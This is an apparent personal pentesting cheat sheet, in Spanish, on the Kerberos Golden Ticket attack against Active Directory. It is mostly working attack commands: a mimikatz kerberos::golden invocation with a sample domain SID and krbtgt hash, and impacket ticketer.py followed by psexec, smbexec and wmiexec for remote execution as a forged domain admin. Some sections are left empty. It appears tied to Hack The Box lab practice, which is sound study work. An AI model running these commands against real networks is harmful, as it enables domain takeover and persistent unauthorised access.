
## DESCRIPTION

El objetivo del ataque del Golden Ticket es construir un TGT, para lo cual se necesita la clave del krbtgt. Por tanto si se obtiene el hash NTLM de la cuenta krbtgt, es posible construir un TGT. Dicho TGT puede contar con la caducidad y permisos que se desee, consiguiendo incluso privilegios de administrador de dominio.

El ticket continuará siendo válido aunque el usuario incluido cambie su contraseña. El TGT solo podrá ser invalidado si expira o cambia la contraseña de la cuenta krbtgt.

What's we need? →  krbtgt NTLM
What's we obtain? → TGT

#### Mas información
* 


## EXPLOITATION

### OPTION 1: DESDE win

Usando mimikatz:
```
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

misc::cmd
```

/krbtgt:1693c6cefafffc7af11ef34d1c788f47: El hash ntlm de la cuenta krbtg es lo mas importante

Luego podemos probar a conectarnos con:

```
PsExec.exe \\dc1 cmd.exe
```

### OPTION 2: DESDE kali

```
# To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```


## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 